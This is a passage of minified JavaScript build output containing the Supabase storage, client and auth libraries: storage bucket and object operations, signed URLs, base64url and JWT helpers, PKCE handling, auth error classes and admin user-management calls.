pr(()=>Promise.resolve().then(()=>On),void 0)).Response:Response}),Yc=a=>{if(Array.isArray(a))return a.map(s=>Yc(s));if(typeof a=="function"||a!==Object(a))return a;const n={};return Object.entries(a).forEach(([s,i])=>{const o=s.replace(/([-_][a-z])/gi,c=>c.toUpperCase().replace(/[-_]/g,""));n[o]=Yc(i)}),n};var qs=function(a,n,s,i){function o(c){return c instanceof s?c:new s(function(d){d(c)})}return new(s||(s=Promise))(function(c,d){function m(p){try{x(i.next(p))}catch(b){d(b)}}function f(p){try{x(i.throw(p))}catch(b){d(b)}}function x(p){p.done?c(p.value):o(p.value).then(m,f)}x((i=i.apply(a,n||[])).next())})};const Ac=a=>a.msg||a.message||a.error_description||a.error||JSON.stringify(a),eb=(a,n,s)=>qs(void 0,void 0,void 0,function*(){const i=yield Zg();a instanceof i&&!s?.noResolveJson?a.json().then(o=>{n(new Jg(Ac(o),a.status||500))}).catch(o=>{n(new Kc(Ac(o),o))}):n(new Kc(Ac(a),a))}),tb=(a,n,s,i)=>{const o={method:a,headers:n?.headers||{}};return a==="GET"?o:(o.headers=Object.assign({"Content-Type":"application/json"},n?.headers),i&&(o.body=JSON.stringify(i)),Object.assign(Object.assign({},o),s))};function Wa(a,n,s,i,o,c){return qs(this,void 0,void 0,function*(){return new Promise((d,m)=>{a(s,tb(n,i,o,c)).then(f=>{if(!f.ok)throw f;return i?.noResolveJson?f:f.json()}).then(f=>d(f)).catch(f=>eb(f,m,i))})})}function yo(a,n,s,i){return qs(this,void 0,void 0,function*(){return Wa(a,"GET",n,s,i)})}function us(a,n,s,i,o){return qs(this,void 0,void 0,function*(){return Wa(a,"POST",n,i,o,s)})}function rb(a,n,s,i,o){return qs(this,void 0,void 0,function*(){return Wa(a,"PUT",n,i,o,s)})}function sb(a,n,s,i){return qs(this,void 0,void 0,function*(){return Wa(a,"HEAD",n,Object.assign(Object.assign({},s),{noResolveJson:!0}),i)})}function i0(a,n,s,i,o){return qs(this,void 0,void 0,function*(){return Wa(a,"DELETE",n,i,o,s)})}var Tt=function(a,n,s,i){function o(c){return c instanceof s?c:new s(function(d){d(c)})}return new(s||(s=Promise))(function(c,d){function m(p){try{x(i.next(p))}catch(b){d(b)}}function f(p){try{x(i.throw(p))}catch(b){d(b)}}function x(p){p.done?c(p.value):o(p.value).then(m,f)}x((i=i.apply(a,n||[])).next())})};const nb={limit:100,offset:0,sortBy:{column:"name",order:"asc"}},am={cacheControl:"3600",contentType:"text/plain;charset=UTF-8",upsert:!1};class ab{constructor(n,s={},i,o){this.url=n,this.headers=s,this.bucketId=i,this.fetch=a0(o)}uploadOrUpdate(n,s,i,o){return Tt(this,void 0,void 0,function*(){try{let c;const d=Object.assign(Object.assign({},am),o);let m=Object.assign(Object.assign({},this.headers),n==="POST"&&{"x-upsert":String(d.upsert)});const f=d.metadata;typeof Blob<"u"&&i instanceof Blob?(c=new FormData,c.append("cacheControl",d.cacheControl),f&&c.append("metadata",this.encodeMetadata(f)),c.append("",i)):typeof FormData<"u"&&i instanceof FormData?(c=i,c.append("cacheControl",d.cacheControl),f&&c.append("metadata",this.encodeMetadata(f))):(c=i,m["cache-control"]=`max-age=${d.cacheControl}`,m["content-type"]=d.contentType,f&&(m["x-metadata"]=this.toBase64(this.encodeMetadata(f)))),o?.headers&&(m=Object.assign(Object.assign({},m),o.headers));const x=this._removeEmptyFolders(s),p=this._getFinalPath(x),b=yield this.fetch(`${this.url}/object/${p}`,Object.assign({method:n,body:c,headers:m},d?.duplex?{duplex:d.duplex}:{})),w=yield b.json();return b.ok?{data:{path:x,id:w.Id,fullPath:w.Key},error:null}:{data:null,error:w}}catch(c){if(ot(c))return{data:null,error:c};throw c}})}upload(n,s,i){return Tt(this,void 0,void 0,function*(){return this.uploadOrUpdate("POST",n,s,i)})}uploadToSignedUrl(n,s,i,o){return Tt(this,void 0,void 0,function*(){const c=this._removeEmptyFolders(n),d=this._getFinalPath(c),m=new URL(this.url+`/object/upload/sign/${d}`);m.searchParams.set("token",s);try{let f;const x=Object.assign({upsert:am.upsert},o),p=Object.assign(Object.assign({},this.headers),{"x-upsert":String(x.upsert)});typeof Blob<"u"&&i instanceof Blob?(f=new FormData,f.append("cacheControl",x.cacheControl),f.append("",i)):typeof FormData<"u"&&i instanceof FormData?(f=i,f.append("cacheControl",x.cacheControl)):(f=i,p["cache-control"]=`max-age=${x.cacheControl}`,p["content-type"]=x.contentType);const b=yield this.fetch(m.toString(),{method:"PUT",body:f,headers:p}),w=yield b.json();return b.ok?{data:{path:c,fullPath:w.Key},error:null}:{data:null,error:w}}catch(f){if(ot(f))return{data:null,error:f};throw f}})}createSignedUploadUrl(n,s){return Tt(this,void 0,void 0,function*(){try{let i=this._getFinalPath(n);const o=Object.assign({},this.headers);s?.upsert&&(o["x-upsert"]="true");const c=yield us(this.fetch,`${this.url}/object/upload/sign/${i}`,{},{headers:o}),d=new URL(this.url+c.url),m=d.searchParams.get("token");if(!m)throw new wd("No token returned by API");return{data:{signedUrl:d.toString(),path:n,token:m},error:null}}catch(i){if(ot(i))return{data:null,error:i};throw i}})}update(n,s,i){return Tt(this,void 0,void 0,function*(){return this.uploadOrUpdate("PUT",n,s,i)})}move(n,s,i){return Tt(this,void 0,void 0,function*(){try{return{data:yield us(this.fetch,`${this.url}/object/move`,{bucketId:this.bucketId,sourceKey:n,destinationKey:s,destinationBucket:i?.destinationBucket},{headers:this.headers}),error:null}}catch(o){if(ot(o))return{data:null,error:o};throw o}})}copy(n,s,i){return Tt(this,void 0,void 0,function*(){try{return{data:{path:(yield us(this.fetch,`${this.url}/object/copy`,{bucketId:this.bucketId,sourceKey:n,destinationKey:s,destinationBucket:i?.destinationBucket},{headers:this.headers})).Key},error:null}}catch(o){if(ot(o))return{data:null,error:o};throw o}})}createSignedUrl(n,s,i){return Tt(this,void 0,void 0,function*(){try{let o=this._getFinalPath(n),c=yield us(this.fetch,`${this.url}/object/sign/${o}`,Object.assign({expiresIn:s},i?.transform?{transform:i.transform}:{}),{headers:this.headers});const d=i?.download?`&download=${i.download===!0?"":i.download}`:"";return c={signedUrl:encodeURI(`${this.url}${c.signedURL}${d}`)},{data:c,error:null}}catch(o){if(ot(o))return{data:null,error:o};throw o}})}createSignedUrls(n,s,i){return Tt(this,void 0,void 0,function*(){try{const o=yield us(this.fetch,`${this.url}/object/sign/${this.bucketId}`,{expiresIn:s,paths:n},{headers:this.headers}),c=i?.download?`&download=${i.download===!0?"":i.download}`:"";return{data:o.map(d=>Object.assign(Object.assign({},d),{signedUrl:d.signedURL?encodeURI(`${this.url}${d.signedURL}${c}`):null})),error:null}}catch(o){if(ot(o))return{data:null,error:o};throw o}})}download(n,s){return Tt(this,void 0,void 0,function*(){const o=typeof s?.transform<"u"?"render/image/authenticated":"object",c=this.transformOptsToQueryString(s?.transform||{}),d=c?`?${c}`:"";try{const m=this._getFinalPath(n);return{data:yield(yield yo(this.fetch,`${this.url}/${o}/${m}${d}`,{headers:this.headers,noResolveJson:!0})).blob(),error:null}}catch(m){if(ot(m))return{data:null,error:m};throw m}})}info(n){return Tt(this,void 0,void 0,function*(){const s=this._getFinalPath(n);try{const i=yield yo(this.fetch,`${this.url}/object/info/${s}`,{headers:this.headers});return{data:Yc(i),error:null}}catch(i){if(ot(i))return{data:null,error:i};throw i}})}exists(n){return Tt(this,void 0,void 0,function*(){const s=this._getFinalPath(n);try{return yield sb(this.fetch,`${this.url}/object/${s}`,{headers:this.headers}),{data:!0,error:null}}catch(i){if(ot(i)&&i instanceof Kc){const o=i.originalError;if([400,404].includes(o?.status))return{data:!1,error:i}}throw i}})}getPublicUrl(n,s){const i=this._getFinalPath(n),o=[],c=s?.download?`download=${s.download===!0?"":s.download}`:"";c!==""&&o.push(c);const m=typeof s?.transform<"u"?"render/image":"object",f=this.transformOptsToQueryString(s?.transform||{});f!==""&&o.push(f);let x=o.join("&");return x!==""&&(x=`?${x}`),{data:{publicUrl:encodeURI(`${this.url}/${m}/public/${i}${x}`)}}}remove(n){return Tt(this,void 0,void 0,function*(){try{return{data:yield i0(this.fetch,`${this.url}/object/${this.bucketId}`,{prefixes:n},{headers:this.headers}),error:null}}catch(s){if(ot(s))return{data:null,error:s};throw s}})}list(n,s,i){return Tt(this,void 0,void 0,function*(){try{const o=Object.assign(Object.assign(Object.assign({},nb),s),{prefix:n||""});return{data:yield us(this.fetch,`${this.url}/object/list/${this.bucketId}`,o,{headers:this.headers},i),error:null}}catch(o){if(ot(o))return{data:null,error:o};throw o}})}encodeMetadata(n){return JSON.stringify(n)}toBase64(n){return typeof Buffer<"u"?Buffer.from(n).toString("base64"):btoa(n)}_getFinalPath(n){return`${this.bucketId}/${n}`}_removeEmptyFolders(n){return n.replace(/^\/|\/$/g,"").replace(/\/+/g,"/")}transformOptsToQueryString(n){const s=[];return n.width&&s.push(`width=${n.width}`),n.height&&s.push(`height=${n.height}`),n.resize&&s.push(`resize=${n.resize}`),n.format&&s.push(`format=${n.format}`),n.quality&&s.push(`quality=${n.quality}`),s.join("&")}}const ib="2.7.1",ob={"X-Client-Info":`storage-js/${ib}`};var yn=function(a,n,s,i){function o(c){return c instanceof s?c:new s(function(d){d(c)})}return new(s||(s=Promise))(function(c,d){function m(p){try{x(i.next(p))}catch(b){d(b)}}function f(p){try{x(i.throw(p))}catch(b){d(b)}}function x(p){p.done?c(p.value):o(p.value).then(m,f)}x((i=i.apply(a,n||[])).next())})};class lb{constructor(n,s={},i){this.url=n,this.headers=Object.assign(Object.assign({},ob),s),this.fetch=a0(i)}listBuckets(){return yn(this,void 0,void 0,function*(){try{return{data:yield yo(this.fetch,`${this.url}/bucket`,{headers:this.headers}),error:null}}catch(n){if(ot(n))return{data:null,error:n};throw n}})}getBucket(n){return yn(this,void 0,void 0,function*(){try{return{data:yield yo(this.fetch,`${this.url}/bucket/${n}`,{headers:this.headers}),error:null}}catch(s){if(ot(s))return{data:null,error:s};throw s}})}createBucket(n,s={public:!1}){return yn(this,void 0,void 0,function*(){try{return{data:yield us(this.fetch,`${this.url}/bucket`,{id:n,name:n,public:s.public,file_size_limit:s.fileSizeLimit,allowed_mime_types:s.allowedMimeTypes},{headers:this.headers}),error:null}}catch(i){if(ot(i))return{data:null,error:i};throw i}})}updateBucket(n,s){return yn(this,void 0,void 0,function*(){try{return{data:yield rb(this.fetch,`${this.url}/bucket/${n}`,{id:n,name:n,public:s.public,file_size_limit:s.fileSizeLimit,allowed_mime_types:s.allowedMimeTypes},{headers:this.headers}),error:null}}catch(i){if(ot(i))return{data:null,error:i};throw i}})}emptyBucket(n){return yn(this,void 0,void 0,function*(){try{return{data:yield us(this.fetch,`${this.url}/bucket/${n}/empty`,{},{headers:this.headers}),error:null}}catch(s){if(ot(s))return{data:null,error:s};throw s}})}deleteBucket(n){return yn(this,void 0,void 0,function*(){try{return{data:yield i0(this.fetch,`${this.url}/bucket/${n}`,{},{headers:this.headers}),error:null}}catch(s){if(ot(s))return{data:null,error:s};throw s}})}}class cb extends lb{constructor(n,s={},i){super(n,s,i)}from(n){return new ab(this.url,this.headers,n,this.fetch)}}const db="2.52.0";let Ia="";typeof Deno<"u"?Ia="deno":typeof document<"u"?Ia="web":typeof navigator<"u"&&navigator.product==="ReactNative"?Ia="react-native":Ia="node";const ub={"X-Client-Info":`supabase-js-${Ia}/${db}`},hb={headers:ub},fb={schema:"public"},mb={autoRefreshToken:!0,persistSession:!0,detectSessionInUrl:!0,flowType:"implicit"},pb={};var xb=function(a,n,s,i){function o(c){return c instanceof s?c:new s(function(d){d(c)})}return new(s||(s=Promise))(function(c,d){function m(p){try{x(i.next(p))}catch(b){d(b)}}function f(p){try{x(i.throw(p))}catch(b){d(b)}}function x(p){p.done?c(p.value):o(p.value).then(m,f)}x((i=i.apply(a,n||[])).next())})};const gb=a=>{let n;return a?n=a:typeof fetch>"u"?n=Km:n=fetch,(...s)=>n(...s)},bb=()=>typeof Headers>"u"?Ym:Headers,vb=(a,n,s)=>{const i=gb(s),o=bb();return(c,d)=>xb(void 0,void 0,void 0,function*(){var m;const f=(m=yield n())!==null&&m!==void 0?m:a;let x=new o(d?.headers);return x.has("apikey")||x.set("apikey",a),x.has("Authorization")||x.set("Authorization",`Bearer ${f}`),i(c,Object.assign(Object.assign({},d),{headers:x}))})};var yb=function(a,n,s,i){function o(c){return c instanceof s?c:new s(function(d){d(c)})}return new(s||(s=Promise))(function(c,d){function m(p){try{x(i.next(p))}catch(b){d(b)}}function f(p){try{x(i.throw(p))}catch(b){d(b)}}function x(p){p.done?c(p.value):o(p.value).then(m,f)}x((i=i.apply(a,n||[])).next())})};function wb(a){return a.endsWith("/")?a:a+"/"}function jb(a,n){var s,i;const{db:o,auth:c,realtime:d,global:m}=a,{db:f,auth:x,realtime:p,global:b}=n,w={db:Object.assign(Object.assign({},f),o),auth:Object.assign(Object.assign({},x),c),realtime:Object.assign(Object.assign({},p),d),global:Object.assign(Object.assign(Object.assign({},b),m),{headers:Object.assign(Object.assign({},(s=b?.headers)!==null&&s!==void 0?s:{}),(i=m?.headers)!==null&&i!==void 0?i:{})}),accessToken:()=>yb(this,void 0,void 0,function*(){return""})};return a.accessToken?w.accessToken=a.accessToken:delete w.accessToken,w}const o0="2.71.1",An=30*1e3,Jc=3,Ec=Jc*An,Nb="http://localhost:9999",kb="supabase.auth.token",Fb={"X-Client-Info":`gotrue-js/${o0}`},Xc="X-Supabase-Api-Version",l0={"2024-01-01":{timestamp:Date.parse("2024-01-01T00:00:00.0Z"),name:"2024-01-01"}},_b=/^([a-z0-9_-]{4})*($|[a-z0-9_-]{3}$|[a-z0-9_-]{2}$)$/i,Sb=600*1e3;class jd extends Error{constructor(n,s,i){super(n),this.__isAuthError=!0,this.name="AuthError",this.status=s,this.code=i}}function Fe(a){return typeof a=="object"&&a!==null&&"__isAuthError"in a}class Ab extends jd{constructor(n,s,i){super(n,s,i),this.name="AuthApiError",this.status=s,this.code=i}}function Eb(a){return Fe(a)&&a.name==="AuthApiError"}class c0 extends jd{constructor(n,s){super(n),this.name="AuthUnknownError",this.originalError=s}}class vs extends jd{constructor(n,s,i,o){super(n,i,o),this.name=s,this.status=i}}class cs extends vs{constructor(){super("Auth session missing!","AuthSessionMissingError",400,void 0)}}function Cb(a){return Fe(a)&&a.name==="AuthSessionMissingError"}class ao extends vs{constructor(){super("Auth session or user missing","AuthInvalidTokenResponseError",500,void 0)}}class io extends vs{constructor(n){super(n,"AuthInvalidCredentialsError",400,void 0)}}class oo extends vs{constructor(n,s=null){super(n,"AuthImplicitGrantRedirectError",500,void 0),this.details=null,this.details=s}toJSON(){return{name:this.name,message:this.message,status:this.status,details:this.details}}}function Tb(a){return Fe(a)&&a.name==="AuthImplicitGrantRedirectError"}class im extends vs{constructor(n,s=null){super(n,"AuthPKCEGrantCodeExchangeError",500,void 0),this.details=null,this.details=s}toJSON(){return{name:this.name,message:this.message,status:this.status,details:this.details}}}class Zc extends vs{constructor(n,s){super(n,"AuthRetryableFetchError",s,void 0)}}function Cc(a){return Fe(a)&&a.name==="AuthRetryableFetchError"}class om extends vs{constructor(n,s,i){super(n,"AuthWeakPasswordError",s,"weak_password"),this.reasons=i}}class ed extends vs{constructor(n){super(n,"AuthInvalidJwtError",400,"invalid_jwt")}}const wo="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_".split(""),lm=` 	
\r=`.split(""),Pb=(()=>{const a=new Array(128);for(let n=0;n<a.length;n+=1)a[n]=-1;for(let n=0;n<lm.length;n+=1)a[lm[n].charCodeAt(0)]=-2;for(let n=0;n<wo.length;n+=1)a[wo[n].charCodeAt(0)]=n;return a})();function cm(a,n,s){if(a!==null)for(n.queue=n.queue<<8|a,n.queuedBits+=8;n.queuedBits>=6;){const i=n.queue>>n.queuedBits-6&63;s(wo[i]),n.queuedBits-=6}else if(n.queuedBits>0)for(n.queue=n.queue<<6-n.queuedBits,n.queuedBits=6;n.queuedBits>=6;){const i=n.queue>>n.queuedBits-6&63;s(wo[i]),n.queuedBits-=6}}function d0(a,n,s){const i=Pb[a];if(i>-1)for(n.queue=n.queue<<6|i,n.queuedBits+=6;n.queuedBits>=8;)s(n.queue>>n.queuedBits-8&255),n.queuedBits-=8;else{if(i===-2)return;throw new Error(`Invalid Base64-URL character "${String.fromCharCode(a)}"`)}}function dm(a){const n=[],s=d=>{n.push(String.fromCodePoint(d))},i={utf8seq:0,codepoint:0},o={queue:0,queuedBits:0},c=d=>{Lb(d,i,s)};for(let d=0;d<a.length;d+=1)d0(a.charCodeAt(d),o,c);return n.join("")}function Rb(a,n){if(a<=127){n(a);return}else if(a<=2047){n(192|a>>6),n(128|a&63);return}else if(a<=65535){n(224|a>>12),n(128|a>>6&63),n(128|a&63);return}else if(a<=1114111){n(240|a>>18),n(128|a>>12&63),n(128|a>>6&63),n(128|a&63);return}throw new Error(`Unrecognized Unicode codepoint: ${a.toString(16)}`)}function Ib(a,n){for(let s=0;s<a.length;s+=1){let i=a.charCodeAt(s);if(i>55295&&i<=56319){const o=(i-55296)*1024&65535;i=(a.charCodeAt(s+1)-56320&65535|o)+65536,s+=1}Rb(i,n)}}function Lb(a,n,s){if(n.utf8seq===0){if(a<=127){s(a);return}for(let i=1;i<6;i+=1)if((a>>7-i&1)===0){n.utf8seq=i;break}if(n.utf8seq===2)n.codepoint=a&31;else if(n.utf8seq===3)n.codepoint=a&15;else if(n.utf8seq===4)n.codepoint=a&7;else throw new Error("Invalid UTF-8 sequence");n.utf8seq-=1}else if(n.utf8seq>0){if(a<=127)throw new Error("Invalid UTF-8 sequence");n.codepoint=n.codepoint<<6|a&63,n.utf8seq-=1,n.utf8seq===0&&s(n.codepoint)}}function Ob(a){const n=[],s={queue:0,queuedBits:0},i=o=>{n.push(o)};for(let o=0;o<a.length;o+=1)d0(a.charCodeAt(o),s,i);return new Uint8Array(n)}function Db(a){const n=[];return Ib(a,s=>n.push(s)),new Uint8Array(n)}function Mb(a){const n=[],s={queue:0,queuedBits:0},i=o=>{n.push(o)};return a.forEach(o=>cm(o,s,i)),cm(null,s,i),n.join("")}function $b(a){return Math.round(Date.now()/1e3)+a}function Bb(){return"xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,function(a){const n=Math.random()*16|0;return(a=="x"?n:n&3|8).toString(16)})}const ar=()=>typeof window<"u"&&typeof document<"u",Ls={tested:!1,writable:!1},u0=()=>{if(!ar())return!1;try{if(typeof globalThis.localStorage!="object")return!1}catch{return!1}if(Ls.tested)return Ls.writable;const a=`lswt-${Math.random()}${Math.random()}`;try{globalThis.localStorage.setItem(a,a),globalThis.localStorage.removeItem(a),Ls.tested=!0,Ls.writable=!0}catch{Ls.tested=!0,Ls.writable=!1}return Ls.writable};function Ub(a){const n={},s=new URL(a);if(s.hash&&s.hash[0]==="#")try{new URLSearchParams(s.hash.substring(1)).forEach((o,c)=>{n[c]=o})}catch{}return s.searchParams.forEach((i,o)=>{n[o]=i}),n}const h0=a=>{let n;return a?n=a:typeof fetch>"u"?n=(...s)=>pr(async()=>{const{default:i}=await Promise.resolve().then(()=>On);return{default:i}},void 0).then(({default:i})=>i(...s)):n=fetch,(...s)=>n(...s)},zb=a=>typeof a=="object"&&a!==null&&"status"in a&&"ok"in a&&"json"in a&&typeof a.json=="function",En=async(a,n,s)=>{await a.setItem(n,JSON.stringify(s))},Os=async(a,n)=>{const s=await a.getItem(n);if(!s)return null;try{return JSON.parse(s)}catch{return s}},as=async(a,n)=>{await a.removeItem(n)};class So{constructor(){this.promise=new So.promiseConstructor((n,s)=>{this.resolve=n,this.reject=s})}}So.promiseConstructor=Promise;function Tc(a){const n=a.split(".");if(n.length!==3)throw new ed("Invalid JWT structure");for(let i=0;i<n.length;i++)if(!_b.test(n[i]))throw new ed("JWT not in base64url format");return{header:JSON.parse(dm(n[0])),payload:JSON.parse(dm(n[1])),signature:Ob(n[2]),raw:{header:n[0],payload:n[1]}}}async function qb(a){return await new Promise(n=>{setTimeout(()=>n(null),a)})}function Wb(a,n){return new Promise((i,o)=>{(async()=>{for(let c=0;c<1/0;c++)try{const d=await a(c);if(!n(c,null,d)){i(d);return}}catch(d){if(!n(c,d)){o(d);return}}})()})}function Vb(a){return("0"+a.toString(16)).substr(-2)}function Hb(){const n=new Uint32Array(56);if(typeof crypto>"u"){const s="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-._~",i=s.length;let o="";for(let c=0;c<56;c++)o+=s.charAt(Math.floor(Math.random()*i));return o}return crypto.getRandomValues(n),Array.from(n,Vb).join("")}async function Gb(a){const s=new TextEncoder().encode(a),i=await crypto.subtle.digest("SHA-256",s),o=new Uint8Array(i);return Array.from(o).map(c=>String.fromCharCode(c)).join("")}async function Qb(a){if(!(typeof crypto<"u"&&typeof crypto.subtle<"u"&&typeof TextEncoder<"u"))return console.warn("WebCrypto API is not supported. Code challenge method will default to use plain instead of sha256."),a;const s=await Gb(a);return btoa(s).replace(/\+/g,"-").replace(/\//g,"_").replace(/=+$/,"")}async function wn(a,n,s=!1){const i=Hb();let o=i;s&&(o+="/PASSWORD_RECOVERY"),await En(a,`${n}-code-verifier`,o);const c=await Qb(i);return[c,i===c?"plain":"s256"]}const Kb=/^2[0-9]{3}-(0[1-9]|1[0-2])-(0[1-9]|1[0-9]|2[0-9]|3[0-1])$/i;function Yb(a){const n=a.headers.get(Xc);if(!n||!n.match(Kb))return null;try{return new Date(`${n}T00:00:00.0Z`)}catch{return null}}function Jb(a){if(!a)throw new Error("Missing exp claim");const n=Math.floor(Date.now()/1e3);if(a<=n)throw new Error("JWT has expired")}function Xb(a){switch(a){case"RS256":return{name:"RSASSA-PKCS1-v1_5",hash:{name:"SHA-256"}};case"ES256":return{name:"ECDSA",namedCurve:"P-256",hash:{name:"SHA-256"}};default:throw new Error("Invalid alg claim")}}const Zb=/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/;function jn(a){if(!Zb.test(a))throw new Error("@supabase/auth-js: Expected parameter to be UUID but is not")}function Pc(){const a={};return new Proxy(a,{get:(n,s)=>{if(s==="__isUserNotAvailableProxy")return!0;if(typeof s=="symbol"){const i=s.toString();if(i==="Symbol(Symbol.toPrimitive)"||i==="Symbol(Symbol.toStringTag)"||i==="Symbol(util.inspect.custom)")return}throw new Error(`@supabase/auth-js: client was created with userStorage option and there was no user stored in the user storage. Accessing the "${s}" property of the session object is not supported. Please use getUser() instead.`)},set:(n,s)=>{throw new Error(`@supabase/auth-js: client was created with userStorage option and there was no user stored in the user storage. Setting the "${s}" property of the session object is not supported. Please use getUser() to fetch a user object you can manipulate.`)},deleteProperty:(n,s)=>{throw new Error(`@supabase/auth-js: client was created with userStorage option and there was no user stored in the user storage. Deleting the "${s}" property of the session object is not supported. Please use getUser() to fetch a user object you can manipulate.`)}})}function um(a){return JSON.parse(JSON.stringify(a))}var ev=function(a,n){var s={};for(var i in a)Object.prototype.hasOwnProperty.call(a,i)&&n.indexOf(i)<0&&(s[i]=a[i]);if(a!=null&&typeof Object.getOwnPropertySymbols=="function")for(var o=0,i=Object.getOwnPropertySymbols(a);o<i.length;o++)n.indexOf(i[o])<0&&Object.prototype.propertyIsEnumerable.call(a,i[o])&&(s[i[o]]=a[i[o]]);return s};const $s=a=>a.msg||a.message||a.error_description||a.error||JSON.stringify(a),tv=[502,503,504];async function hm(a){var n;if(!zb(a))throw new Zc($s(a),0);if(tv.includes(a.status))throw new Zc($s(a),a.status);let s;try{s=await a.json()}catch(c){throw new c0($s(c),c)}let i;const o=Yb(a);if(o&&o.getTime()>=l0["2024-01-01"].timestamp&&typeof s=="object"&&s&&typeof s.code=="string"?i=s.code:typeof s=="object"&&s&&typeof s.error_code=="string"&&(i=s.error_code),i){if(i==="weak_password")throw new om($s(s),a.status,((n=s.weak_password)===null||n===void 0?void 0:n.reasons)||[]);if(i==="session_not_found")throw new cs}else if(typeof s=="object"&&s&&typeof s.weak_password=="object"&&s.weak_password&&Array.isArray(s.weak_password.reasons)&&s.weak_password.reasons.length&&s.weak_password.reasons.reduce((c,d)=>c&&typeof d=="string",!0))throw new om($s(s),a.status,s.weak_password.reasons);throw new Ab($s(s),a.status||500,i)}const rv=(a,n,s,i)=>{const o={method:a,headers:n?.headers||{}};return a==="GET"?o:(o.headers=Object.assign({"Content-Type":"application/json;charset=UTF-8"},n?.headers),o.body=JSON.stringify(i),Object.assign(Object.assign({},o),s))};async function Ee(a,n,s,i){var o;const c=Object.assign({},i?.headers);c[Xc]||(c[Xc]=l0["2024-01-01"].name),i?.jwt&&(c.Authorization=`Bearer ${i.jwt}`);const d=(o=i?.query)!==null&&o!==void 0?o:{};i?.redirectTo&&(d.redirect_to=i.redirectTo);const m=Object.keys(d).length?"?"+new URLSearchParams(d).toString():"",f=await sv(a,n,s+m,{headers:c,noResolveJson:i?.noResolveJson},{},i?.body);return i?.xform?i?.xform(f):{data:Object.assign({},f),error:null}}async function sv(a,n,s,i,o,c){const d=rv(n,i,o,c);let m;try{m=await a(s,Object.assign({},d))}catch(f){throw console.error(f),new Zc($s(f),0)}if(m.ok||await hm(m),i?.noResolveJson)return m;try{return await m.json()}catch(f){await hm(f)}}function Cr(a){var n;let s=null;ov(a)&&(s=Object.assign({},a),a.expires_at||(s.expires_at=$b(a.expires_in)));const i=(n=a.user)!==null&&n!==void 0?n:a;return{data:{session:s,user:i},error:null}}function fm(a){const n=Cr(a);return!n.error&&a.weak_password&&typeof a.weak_password=="object"&&Array.isArray(a.weak_password.reasons)&&a.weak_password.reasons.length&&a.weak_password.message&&typeof a.weak_password.message=="string"&&a.weak_password.reasons.reduce((s,i)=>s&&typeof i=="string",!0)&&(n.data.weak_password=a.weak_password),n}function hs(a){var n;return{data:{user:(n=a.user)!==null&&n!==void 0?n:a},error:null}}function nv(a){return{data:a,error:null}}function av(a){const{action_link:n,email_otp:s,hashed_token:i,redirect_to:o,verification_type:c}=a,d=ev(a,["action_link","email_otp","hashed_token","redirect_to","verification_type"]),m={action_link:n,email_otp:s,hashed_token:i,redirect_to:o,verification_type:c},f=Object.assign({},d);return{data:{properties:m,user:f},error:null}}function iv(a){return a}function ov(a){return a.access_token&&a.refresh_token&&a.expires_in}const Rc=["global","local","others"];var lv=function(a,n){var s={};for(var i in a)Object.prototype.hasOwnProperty.call(a,i)&&n.indexOf(i)<0&&(s[i]=a[i]);if(a!=null&&typeof Object.getOwnPropertySymbols=="function")for(var o=0,i=Object.getOwnPropertySymbols(a);o<i.length;o++)n.indexOf(i[o])<0&&Object.prototype.propertyIsEnumerable.call(a,i[o])&&(s[i[o]]=a[i[o]]);return s};class cv{constructor({url:n="",headers:s={},fetch:i}){this.url=n,this.headers=s,this.fetch=h0(i),this.mfa={listFactors:this._listFactors.bind(this),deleteFactor:this._deleteFactor.bind(this)}}async signOut(n,s=Rc[0]){if(Rc.indexOf(s)<0)throw new Error(`@supabase/auth-js: Parameter scope must be one of ${Rc.join(", ")}`);try{return await Ee(this.fetch,"POST",`${this.url}/logout?scope=${s}`,{headers:this.headers,jwt:n,noResolveJson:!0}),{data:null,error:null}}catch(i){if(Fe(i))return{data:null,error:i};throw i}}async inviteUserByEmail(n,s={}){try{return await Ee(this.fetch,"POST",`${this.url}/invite`,{body:{email:n,data:s.data},headers:this.headers,redirectTo:s.redirectTo,xform:hs})}catch(i){if(Fe(i))return{data:{user:null},error:i};throw i}}async generateLink(n){try{const{options:s}=n,i=lv(n,["options"]),o=Object.assign(Object.assign({},i),s);return"newEmail"in i&&(o.new_email=i?.newEmail,delete o.newEmail),await Ee(this.fetch,"POST",`${this.url}/admin/generate_link`,{body:o,headers:this.headers,xform:av,redirectTo:s?.redirectTo})}catch(s){if(Fe(s))return{data:{properties:null,user:null},error:s};throw s}}async createUser(n){try{return await Ee(this.fetch,"POST",`${this.url}/admin/users`,{body:n,headers:this.headers,xform:hs})}catch(s){if(Fe(s))return{data:{user:null},error:s};throw s}}async listUsers(n){var s,i,o,c,d,m,f;try{const x={nextPage:null,lastPage:0,total:0},p=await Ee(this.fetch,"GET",`${this.url}/admin/users`,{headers:this.headers,noResolveJson:!0,query:{page:(i=(s=n?.page)===null||s===void 0?void 0:s.toString())!==null&&i!==void 0?i:"",per_page:(c=(o=n?.perPage)===null||o===void 0?void 0:o.toString())!==null&&c!==void 0?c:""},xform:iv});if(p.error)throw p.error;const b=await p.json(),w=(d=p.headers.get("x-total-count"))!==null&&d!==void 0?d:0,j=(f=(m=p.headers.get("link"))===null||m===void 0?void 0:m.split(","))!==null&&f!==void 0?f:[];return j.length>0&&(j.forEach(N=>{const k=parseInt(N.split(";")[0].split("=")[1].substring(0,1)),F=JSON.parse(N.split(";")[1].split("=")[1]);x[`${F}Page`]=k}),x.total=parseInt(w)),{data:Object.assign(Object.assign({},b),x),error:null}}catch(x){if(Fe(x))return{data:{users:[]},error:x};throw x}}async getUserById(n){jn(n);try{return await Ee(this.fetch,"GET",`${this.url}/admin/users/${n}`,{headers:this.headers,xform:hs})}catch(s){if(Fe(s))return{data:{user:null},error:s};throw s}}async updateUserById(n,s){jn(n);try{return await Ee(this.fetch,"PUT",`${this.url}/admin/users/${n}`,{body:s,headers:this.headers,xform:hs})}catch(i){if(Fe(i))return{data:{user:null},error:i};throw i}}async deleteUser(n,s=!1){jn(n);try{return await Ee(this.fetch,"DELETE",`${this.url}/admin/users/${n}`,{headers:this.headers,body:{should_soft_delete:s},xform:hs})}catch(i){if(Fe(i))return{data:{user:null},error:i};throw i}}async _listFactors(n){jn(n.userId);try{const{data:s,error:i}=await 